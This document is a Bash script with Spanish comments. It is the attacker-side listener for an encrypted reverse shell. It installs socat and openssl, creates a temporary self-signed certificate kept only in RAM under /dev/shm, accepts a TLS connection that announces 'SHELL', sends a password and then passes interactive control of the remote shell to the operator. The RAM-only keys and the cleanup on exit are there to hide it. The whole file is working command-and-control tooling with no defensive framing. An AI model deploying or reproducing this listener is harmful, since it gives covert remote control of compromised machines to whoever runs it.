#!/bin/bash
PORT=${1:-4444}
PASS=$2

if [ -z "$PASS" ]; then echo "Uso: $0 <puerto> <pass>"; exit 1; fi

# --- VERIFICACIÓN DE DEPENDENCIAS (Kali/Debian/Ubuntu) ---
DEPS=("socat" "openssl")
for tool in "${DEPS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "\e[1;31m[!]\e[0m $tool no encontrado. Intentando instalar..."
        sudo apt-get update && sudo apt-get install -y "$tool"
        if [ $? -ne 0 ]; then
            echo "[-] Error al instalar $tool. Hazlo manualmente: sudo apt install $tool"
            exit 1
        fi
    fi
done

# --- CONFIGURACIÓN DE CERTIFICADOS EN RAM ---
CERT="/dev/shm/cert.pem"; KEY="/dev/shm/key.pem"; COMBINED="/dev/shm/server.pem"

# Generar certificado dinámico
openssl req -x509 -newkey rsa:4096 -keyout "$KEY" -out "$CERT" -days 1 -nodes -subj "/C=US/O=Dev/CN=localhost" 2>/dev/null
cat "$KEY" "$CERT" > "$COMBINED"

# Limpieza al salir
trap "rm -f $KEY $CERT $COMBINED; echo -e '\n\e[1;31m[-]\e[0m Limpiando RAM y saliendo...'; exit" SIGINT

# --- BUCLE PRINCIPAL ---
while true; do
    echo -e "\e[1;32m[+]\e[0m Esperando TLS con SOCAT en puerto \e[1;33m$PORT\e[0m..."
    
    # 1. Fase de Handshake (Timeout de 2s para no bloquear el script)
    IDENT=$(socat -T 2 OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr - | head -n 1 | tr -d '\r\n')
    
    if [[ "$IDENT" == *"SHELL"* ]]; then
        echo -e "[*] Handshake: \e[1;36m$IDENT\e[0m. Validando con pass: \e[1;33m$PASS\e[0m"
        
        # 2. Fase de Sesión: Enviamos password y entregamos el control al 'cat'
        # Usamos socat para conectar el stdin/stdout a la conexión TLS
        (sleep 1; echo "$PASS"; cat) | socat OPENSSL-LISTEN:$PORT,cert=$COMBINED,verify=0,reuseaddr -
        
        echo -e "\n\e[1;34m[*]\e[0m Sesión finalizada. Volviendo a escucha..."
    fi
done
